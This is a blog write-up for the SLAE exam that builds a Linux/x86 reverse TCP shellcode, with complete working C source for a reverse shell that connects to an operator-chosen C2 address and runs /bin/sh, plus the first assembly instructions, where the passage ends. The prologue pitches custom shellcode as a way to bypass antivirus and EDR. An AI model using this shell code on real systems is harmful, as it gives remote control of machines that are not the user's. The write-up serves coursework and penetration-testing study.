# SLAE Exam Assignment 2 - Creating a Reverse TCP shellcode

## Prologue
So the second task that we have for our SLAE certification exam is creating a reverse TCP shellcode for Linux/x86 architecture using the knowledge that we have gathered from the wonderful course and the shellcoding techniques that we have accumulated over time.

To be honest this was easily one of my most favourite assignments that I had the pleasure of doing.

Why so? Let me tell you why.

So we create Meterpreter reverse TCP payloads all the time for exploitation purposes right? But invariably what happens is our payload getting caught and detected by AVs and EDRs. But that's all history now.
No more getting caught by AVs and EDRs and next-gen security products because now we can create our very own custom reverse TCP shellcode that is capable of bypassing all of the aforementioned security solutions!
Also there's no ignoring the fact that we hacker tribes get a different joy from using our own custom tools wherever possible in red-teaming engagements/CTFs yada yada yada.

So without any further ado let's get down with it!

## So what is Reverse TCP anyway?
Let's look at a visual representation first and then we'll talk about it.

![Reverse TCP Overview](../assets/images/reverse_tcp_overview.png "Reverse TCP Overview")

We can clearly see from this image that in case of a Reverse TCP shell, the client a.k.a. the victim/target machine beacons out to the server a.k.a. the attacker machine who is listening for connections at a specified port. Now after the server receives a connection, it can then send out commands to the client for it to execute on the victim machine.

Since the direction of connection is reversed from a Bind TCP connection(first post remember?), it is also known as Reverse TCP.

So how is this useful?

Well in certain restricted environments which is almost always the case you will not be able to use a Bind TCP shell to get access because the firewall is going to block the incoming connection request to the victim machine.
But a Reverse TCP shell can be used in those scenarios because the firewall most likely will not block a machine of their own network from making a connection attempt to an outside machine!

So all in all, Reverse TCP shells are very useful in penetration testing and this payload is what we use on almost every occassion with a few exceptions.

## A C Prototype first
If we are going to program in something as low-level as machine code it is only fair that we first create a prototype in a high-level language like C/C++ to conceptualize it and get a template for creating our assembly code right?

```c
// Filename: reverse_tcp.cpp
// Author: Upayan a.k.a. slaeryan
// Purpose: This is a x86 Linux reverse TCP shell written in C/C++ that inputs
// the C2 address and the port from the console by the operator.
// Usage: ./reverse_tcp 192.168.1.104 8080
// Note: The connection attempt is not tuned so run the listener first.
// Compile with:
// g++ reverse_tcp.cpp -o reverse_tcp
// Testing: nc -lnvp 8080

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

//#define C2_ADDR "192.168.1.104"
//#define C2_PORT 8080 

int main(int argc, char const *argv[])
{
	// Console C2 Address input from operator
	char* C2_ADDR = (char*)argv[1];
	// Console C2 Port input from operator
	char* c2portstring = (char*)argv[2];
	int C2_PORT = atoi(c2portstring);
  	// Declaring a sockaddr_in struct and an int var for socket file descriptor
	struct sockaddr_in client;
	int sockfd;
	// Initializing the sockaddr_in struct
	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(C2_ADDR);
	client.sin_port = htons(C2_PORT);
	// 1st Syscall for creating the socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	// 2nd Syscall for connect()
	connect(sockfd, (struct sockaddr *)&client, sizeof(client));
	// 3rd Syscall for dup2()
	dup2(sockfd, 0); // STDIN
	dup2(sockfd, 1); // STDOUT
	dup2(sockfd, 2); // STDERR
	// 4th Syscall for execve()
	execve("/bin/sh", 0, 0);
	return 0;
}
```

And here is a fully-functional C source for a reverse shell payload. Stripping the C code down to it's essential details, we note the following syscalls to be made in our assembly code:

1. socket
1. connect
1. dup2
1. execve

Beautiful! Now let's get started with recreating the payload in ASM.

## Creating the assembly program
The first set of instructions are almost always the same which is clearing the register sets we will be using in our program.

```c
; Clearing the first 4 registers for 1st Syscall - socket()

xor eax, eax       ; May also sub OR mul for zeroing out
xor ebx, ebx       ; Clearing out EBX 
xor ecx, ecx       ; Clearing out ECX
cdq                ; Clearing out EDX 
```

Note that we didn't use XOR'ing for clearing the EDX register instead we used cdq which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 3 bytes in the process ;)


Now we will initiate the socket syscall using the good ol' software interrupt 80h.

```c
; Syscall value for socket() = 359 OR 0x167, loading it in AX
mov ax, 0x167
; Loading 2 in BL for AF_INET - 1st argument for socket()
mov bl, 0x02
; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
mov cl, 0x01
; socket() Syscall
int 0x80
```


